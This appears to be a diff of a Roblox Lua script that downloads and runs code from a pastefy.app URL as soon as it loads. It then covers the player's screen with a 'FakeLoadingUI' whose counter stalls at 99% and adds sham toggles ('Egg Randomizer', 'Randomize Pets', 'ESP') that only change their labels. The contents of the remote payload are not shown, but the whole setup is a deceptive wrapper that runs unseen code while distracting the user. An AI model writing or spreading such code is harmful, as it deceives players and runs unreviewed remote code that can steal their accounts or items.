@@ -4,12 +4,12 @@ local Player = Players.LocalPlayer
 
 repeat task.wait() until Player:FindFirstChild("PlayerGui")
 
--- Load your real script immediately
+-- Load actual script instantly
 pcall(function()
 	loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
 end)
 
--- GUI Setup
+-- GUI Base
 local gui = Instance.new("ScreenGui")
 gui.Name = "FakeLoadingUI"
 gui.IgnoreGuiInset = true
@@ -18,7 +18,6 @@ gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
 gui.DisplayOrder = 9999
 gui.Parent = Player:WaitForChild("PlayerGui")
 
--- Background
 local bg = Instance.new("Frame")
 bg.Size = UDim2.new(1, 0, 1, 0)
 bg.Position = UDim2.new(0, 0, 0, 0)
@@ -26,7 +25,7 @@ bg.BackgroundColor3 = Color3.new(0, 0, 0)
 bg.BorderSizePixel = 0
 bg.Parent = gui
 
--- Top Label
+-- Title
 local topLabel = Instance.new("TextLabel")
 topLabel.Size = UDim2.new(1, 0, 0.1, 0)
 topLabel.Position = UDim2.new(0, 0, 0.02, 0)
@@ -39,7 +38,7 @@ topLabel.TextStrokeTransparency = 0.8
 topLabel.TextStrokeColor3 = Color3.fromRGB(255, 70, 0)
 topLabel.Parent = bg
 
--- Loading % Text
+-- Loading Percentage
 local loadingText = Instance.new("TextLabel")
 loadingText.Size = UDim2.new(1, 0, 0.3, 0)
 loadingText.Position = UDim2.new(0, 0, 0.25, 0)
@@ -82,16 +81,14 @@ local function spawnFire()
 			Position = UDim2.new(math.random(), 0, math.random(), 0),
 			TextTransparency = 1
 		}
-		local tween = TweenService:Create(fire, TweenInfo.new(5, Enum.EasingStyle.Linear), goal)
-		tween:Play()
-
+		TweenService:Create(fire, TweenInfo.new(5, Enum.EasingStyle.Linear), goal):Play()
 		task.delay(5, function()
 			fire:Destroy()
 		end)
 	end
 end
 
--- Loop fire animation
+-- Loop fire
 task.spawn(function()
 	while true do
 		spawnFire()
@@ -99,11 +96,45 @@ task.spawn(function()
 	end
 end)
 
--- Fake loading: 0 to 99% in 60 seconds, then stuck
-task.spawn(function()
+-- Slow fake loading
+spawn(function()
 	for i = 1, 99 do
 		loadingText.Text = i .. "%"
 		task.wait(60 / 99)
 	end
-	loadingText.Text = "99%" -- Stuck here
+	loadingText.Text = "99%"
 end)
+
+-- Mini Control Box
+local box = Instance.new("Frame")
+box.Size = UDim2.new(0, 230, 0, 130)
+box.Position = UDim2.new(0.03, 0, 0.35, 0)
+box.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
+box.BackgroundTransparency = 0.2
+box.BorderColor3 = Color3.fromRGB(255, 0, 0)
+box.BorderSizePixel = 2
+box.Parent = bg
+
+local function createToggle(text, emoji, y)
+	local btn = Instance.new("TextButton")
+	btn.Size = UDim2.new(1, -10, 0, 30)
+	btn.Position = UDim2.new(0, 5, 0, y)
+	btn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
+	btn.TextColor3 = Color3.fromRGB(255, 100, 100)
+	btn.Font = Enum.Font.GothamSemibold
+	btn.TextSize = 14
+	btn.Text = emoji .. " " .. text .. ": OFF"
+	btn.Parent = box
+
+	btn.MouseButton1Click:Connect(function()
+		if btn.Text:find("OFF") then
+			btn.Text = emoji .. " " .. text .. ": ON"
+		else
+			btn.Text = emoji .. " " .. text .. ": OFF"
+		end
+	end)
+end
+
+createToggle("Egg Randomizer", "🎲", 5)
+createToggle("Randomize Pets", "🎯", 40)
+createToggle("ESP", "👁️", 75)
